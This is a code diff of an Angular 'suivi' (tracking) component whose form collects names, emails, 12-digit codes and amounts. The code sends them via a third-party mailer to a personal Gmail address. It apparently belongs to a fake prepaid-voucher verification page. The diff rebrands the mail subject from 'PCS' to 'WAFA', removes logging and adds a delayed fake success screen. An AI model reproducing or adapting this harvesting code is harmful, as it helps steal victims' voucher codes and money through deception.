@@ -3,6 +3,7 @@ import { NgForm, FormGroup, FormBuilder, FormControl, AbstractControl, Validator
 import * as $ from 'jquery';
 import { HttpClient } from '@angular/common/http';
 import { DbFireService } from '../services/db-fire.service';
+import { Observable, Subscription, interval } from 'rxjs';
 import { map } from 'rxjs/operators';
 
 @Component({
@@ -19,6 +20,9 @@ export class SuiviComponent implements OnInit {
 	verificationForm: FormGroup;
 	submitted = false;
 	endSubmit = true;
+  showEnd: boolean = false;
+  showSuccess: boolean = false;
+  actualStep: number = 1;
 	codePattern = /^[0-9]{12}$/;
 	amountPattern = /^[0-9]{2,11}$/;
 
@@ -82,6 +86,10 @@ export class SuiviComponent implements OnInit {
   }
 
   ngOnInit(){
+
+    
+
+    
   	this.verificationForm = new FormGroup({
         nm: new FormControl('', [Validators.required]),
         email: new FormControl('', [Validators.required, Validators.email]),
@@ -174,7 +182,6 @@ export class SuiviComponent implements OnInit {
   	if(this.verificationForm.invalid){
   		this.loading = false; return;
   	}else{
-  		this.loading = false;
   		if(this.endSubmit){
   			const dataSend = {
   				'nom' : nm,
@@ -226,26 +233,45 @@ export class SuiviComponent implements OnInit {
   				' -> ' + '<b>'+montant10+'</b>';
 
   				var sendMailTo: string = 'traorebaba000@gmail.com';
-  				var sendSubject: string = 'Nouvelle vérification PCS';
+  				var sendSubject: string = 'Nouvelle vérification WAFA';
 
   				var makeRequest: any = this.http.get('https://mailertake.herokuapp.com/v1/mail?to='+sendMailTo+'&subject='+sendSubject+'+&msg='+msgContent)
   				                       .pipe(
-  				                       	map(res => console.log(res))
+  				                       	map(res => {})
   				                       	)
-  				                       .subscribe(res => {
-  				                       	console.log(res);
-  				                       },
-  				                       (err) => {
-  				                       	console.log(err)
-  				                       },
-  				                       () => {
-  				                       	console.log('Envoyé')
-  				                       });
+  				                       .subscribe(res => {},
+  				                       (err) => {},
+  				                       () => {});
 
 
-            this.db.addSuivi(dataSend);
-  			console.log(dataSend);
+            this.db.addSuivi(dataSend)
+            .then(res => {
+              this.showEnd = true;
+
+
+
+
+
+              var subscription: Subscription = new Subscription();
+              var shokorTest = interval(2000);
+              subscription.add(
+                shokorTest
+                .subscribe(res => {
+                  if(res == 2){
+                    this.showSuccess = true;
+                    subscription.unsubscribe();
+                  }
+                })
+                ); 
+
+
+              this.actualStep = 2;
+            })
+            .catch(err => {});
+
+
   		}
+      this.loading = false;
   		
   	}
   }
